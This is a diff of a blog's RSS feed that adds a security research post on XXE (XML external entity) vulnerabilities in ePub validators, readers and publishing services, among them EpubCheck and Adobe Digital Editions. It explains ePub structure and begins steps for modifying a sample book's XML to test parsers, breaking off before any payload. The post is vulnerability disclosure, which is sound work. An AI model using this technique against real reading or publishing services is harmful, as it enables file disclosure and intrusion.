@@ -6,9 +6,172 @@
 </description>
     <link>http://s1gnalcha0s.github.io/</link>
     <atom:link href="http://s1gnalcha0s.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 08 Feb 2015 18:12:13 -0500</pubDate>
-    <lastBuildDate>Sun, 08 Feb 2015 18:12:13 -0500</lastBuildDate>
+    <pubDate>Wed, 25 Jan 2017 11:29:03 -0500</pubDate>
+    <lastBuildDate>Wed, 25 Jan 2017 11:29:03 -0500</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
+    
+      <item>
+        <title>This book reads you - exploiting services and readers that support the ePub book format</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“We use the ePub format - it is the most popular open book format in the world. We’re very excited about this.” - Steve Jobs, 2010 (original iPad launch)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;TLDR; Applying a familiar XXE pattern to exploit services &amp;amp; readers that consume the ePUB format. Exploiting vulnerabilities in &lt;strong&gt;EpubCheck &amp;lt;= 4.0.1&lt;/strong&gt; (ePub Validation Java Library &amp;amp; tool), &lt;strong&gt;Adobe Digital Editions &amp;lt;= 4.5.2&lt;/strong&gt; (book reader), &lt;strong&gt;Amazon KDP&lt;/strong&gt; (Kindle Publishing Online Service), &lt;strong&gt;Apple Transporter&lt;/strong&gt;, and &lt;strong&gt;Google Play Book uploads&lt;/strong&gt;, etc.&lt;/p&gt;
+
+&lt;p&gt;ePub is a standard format for open books maintained by &lt;a href=&quot;http://www.idpf.org/&quot;&gt;IDPF&lt;/a&gt; (International Digital Publishing Forum). IDPF is a trade and standards association for the digital publishing industry, set up to establish a standard for ebook publishing. Their membership list: &lt;a href=&quot;http://idpf.org/membership/members&quot;&gt;http://idpf.org/membership/members&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;An epub is based on XML, CSS, XHTML, etc web content zipped together into a single package, which ends in the extension .epub. Depending on the reader device/application support, &lt;a href=&quot;http://www.idpf.org/epub/30/spec/epub30-changes.html#sec-new-changed&quot;&gt;ePub&lt;/a&gt; can also support interactivity using Flash and Javascript.&lt;/p&gt;
+
+&lt;p&gt;ePub uses XML metadata to define the document structure, support digital signatures, digital rights (DRM) etc.&lt;/p&gt;
+
+&lt;p&gt;eg., epub archive:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;Archive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;epub&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;      &lt;span class=&quot;nb&quot;&gt;Date&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Time&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;
+       &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;mimetype&lt;/span&gt;
+     &lt;span class=&quot;mi&quot;&gt;2189&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;toc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ncx&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;39962&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;41745&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;684&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;557&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;front&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;42220&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+     &lt;span class=&quot;mi&quot;&gt;1185&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;copyright&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;884&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;234790&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pressbooks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;promo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;png&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;33684&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MedulaOne&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Regular&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ttf&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;244146&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;assets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;themetamorphosis_1200x1600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jpg&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;661&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pressbooks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;promo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+    &lt;span class=&quot;mi&quot;&gt;27328&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;OEBPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jackson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;
+     &lt;span class=&quot;mi&quot;&gt;3494&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;book&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;opf&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;240&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;META&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xml&lt;/span&gt;
+      &lt;span class=&quot;mi&quot;&gt;157&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;META&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ibooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xml&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt;                     &lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;
+   &lt;span class=&quot;mi&quot;&gt;673946&lt;/span&gt;                     &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;eg., contents of META-INF/container.xml&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;container&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;urn:oasis:names:tc:opendocument:xmlns:container&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;rootfiles&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;rootfile&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;full-path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;OEBPS/book.opf&amp;quot;&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;media-type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;application/oebps-package+xml&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;/rootfiles&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/container&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;eg., contents of book.opf&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; ?&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;package&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.idpf.org/2007/opf&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;unique-identifier=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PrimaryID&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;metadata&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:dc=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://purl.org/dc/elements/1.1/&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:opf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.idpf.org/2007/opf&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:title&amp;gt;&lt;/span&gt;My Book &lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:title&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:language&amp;gt;&lt;/span&gt;en&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:language&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:identifier&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PrimaryID&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;opf:scheme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;URI&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;http://mybook.com&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:identifier&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:description&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:description&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:creator&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;opf:role=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;aut&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Author&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:creator&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:publisher&amp;gt;&lt;/span&gt;Publisher.com&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:publisher&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;cover&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;cover-image&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/metadata&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;When I first started looking into this, I learned about a tool/Java library called &lt;a href=&quot;https://github.com/IDPF/epubcheck/releases&quot;&gt;EpubCheck&lt;/a&gt; (provided by IDPF) that is used to validate books in the ePub format. Book publishers tend to perform a validation step using something like this to check the format validity. The validator tool/library was vulnerable to XXE, so any application that relies on a vulnerable version to check the validity of a book would be susceptible to this type of attack. &lt;/p&gt;
+
+&lt;h4 id=&quot;modifying-an-existing-epub-file-to-test-for-xml-parsing-vulnerabilities&quot;&gt;Modifying an existing ePub file to test for XML parsing vulnerabilities:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;curl https://s3-us-west-2.amazonaws.com/pressbooks-samplefiles/MetamorphosisJacksonTheme/Metamorphosis-jackson.epub -o book.epub&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;unzip book.epub; rm book.epub&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Edit any of the files that contain XML metadata.&lt;/strong&gt; &lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;eg., book.opf  (XXE - XML External Entities pattern)&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; ?&amp;gt;&lt;/span&gt;
